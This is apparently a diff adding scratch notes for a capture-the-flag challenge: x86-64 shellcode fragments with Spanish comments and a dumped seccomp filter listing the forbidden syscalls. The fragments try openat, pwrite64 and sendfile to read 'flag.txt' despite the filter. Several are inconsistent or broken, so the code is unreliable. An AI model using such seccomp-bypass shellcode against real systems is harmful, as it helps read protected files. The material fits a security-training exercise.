@@ -1,0 +1,117 @@
+; Leer el valor del enlace simbólico usando readlink
+    mov rax, 89        ; Número de la llamada al sistema para readlink (sys_readlink)
+    mov rdi, symlink_path  ; Puntero a la ruta del enlace simbólico
+    mov rsi, buf_symlink   ; Puntero al buffer donde almacenar el valor del enlace simbólico
+    mov rdx, 4096      ; Tamaño máximo del valor del enlace simbólico
+    syscall
+    
+    ; Almacenar la longitud del valor del enlace simbólico en rdx para usarlo más adelante
+    mov rdx, rax
+
+    ; Escribir el valor del enlace simbólico en la salida estándar usando writev
+    mov rax, 40        ; Número de la llamada al sistema para writev (sys_writev)
+    mov rdi, 1         ; Descriptor de archivo para salida estándar (STDOUT_FILENO)
+    lea rsi, [buf_symlink]  ; Puntero al buffer que contiene el valor del enlace simbólico
+    mov rdx, rdx       ; Longitud del valor del enlace simbólico
+    syscall
+
+    ; Salir del programa exitosamente
+    mov rax, 60        ; Número de la llamada al sistema para salir (sys_exit)
+    xor rdi, rdi       ; Código de salida (0 para éxito)
+    syscall
+
+
+
+
+
+
+
+mov rax, 89
+mov rdi, {u64("/bin/sh")}
+mov rsi, 22
+mov rdx, 4096
+syscall
+
+
+
+
+
+
+
+
+
+
+
+
+=))))))))))))))))))))))))))))
+
+xor  rdx, rdx
+push rdx
+mov  rsi, {u64(b'flag.txt')}
+push rsi
+mov  rsi, rsp
+xor  rdi, rdi
+sub  rdi, 100
+mov  rax, 0x101
+syscall
+
+
+mov rdi, rax
+mov rax, 18
+xor rsi, rsi
+xor rdx, rdx
+lea r10, [rel file_content]
+mov r8, 255
+syscall
+
+
+
+
+ line  CODE  JT   JF      K
+=================================
+ 0000: 0x20 0x00 0x00 0x00000004  A = arch
+ 0001: 0x15 0x00 0x16 0xc000003e  if (A != ARCH_X86_64) goto 0024
+ 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
+ 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
+ 0004: 0x15 0x00 0x13 0xffffffff  if (A != 0xffffffff) goto 0024
+ 0005: 0x15 0x12 0x00 0x00000000  if (A == read) goto 0024
+ 0006: 0x15 0x11 0x00 0x00000001  if (A == write) goto 0024
+ 0007: 0x15 0x10 0x00 0x00000002  if (A == open) goto 0024
+ 0008: 0x15 0x0f 0x00 0x00000011  if (A == pread64) goto 0024
+ 0009: 0x15 0x0e 0x00 0x00000013  if (A == readv) goto 0024
+ 0010: 0x15 0x0d 0x00 0x00000028  if (A == sendfile) goto 0024
+ 0011: 0x15 0x0c 0x00 0x00000039  if (A == fork) goto 0024
+ 0012: 0x15 0x0b 0x00 0x0000003b  if (A == execve) goto 0024
+ 0013: 0x15 0x0a 0x00 0x00000113  if (A == splice) goto 0024
+ 0014: 0x15 0x09 0x00 0x00000127  if (A == preadv) goto 0024
+ 0015: 0x15 0x08 0x00 0x00000128  if (A == pwritev) goto 0024
+ 0016: 0x15 0x07 0x00 0x00000142  if (A == execveat) goto 0024
+ 0017: 0x15 0x00 0x05 0x00000014  if (A != writev) goto 0023
+ 0018: 0x20 0x00 0x00 0x00000014  A = fd >> 32 # writev(fd, vec, vlen)
+ 0019: 0x25 0x03 0x00 0x00000000  if (A > 0x0) goto 0023
+ 0020: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0024
+ 0021: 0x20 0x00 0x00 0x00000010  A = fd # writev(fd, vec, vlen)
+ 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
+ 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
+ 0024: 0x06 0x00 0x00 0x00000000  return KILL
+
+
+
+No usar: read,write,open,pread64,readv,sendfile,fork,execve,splice,preadv,pwritev,execveat
+no podemos llamar a: 0x0,0x1, 0x2, 0x11, 0x13, 0x28, 0x39, 0x3b,0x113,0x127,0x128,0x142,0x14
+
+
+
+
+        xor rdx, rdx        ; flags
+        mov rdi, 0xffffff9c ; AT_FDCWD
+        lea rsi, [rel buf]  ; path
+        mov rax, 257        ; openat
+        syscall
+
+        xor rdi, rdi        ; out fd // 0
+        mov rsi, rax        ; out fd // from openat result
+        xor rdx, rdx        ; offset // 0
+        mov r10, 255        ; size
+        mov rax, 40         ; sendfile
+        syscall
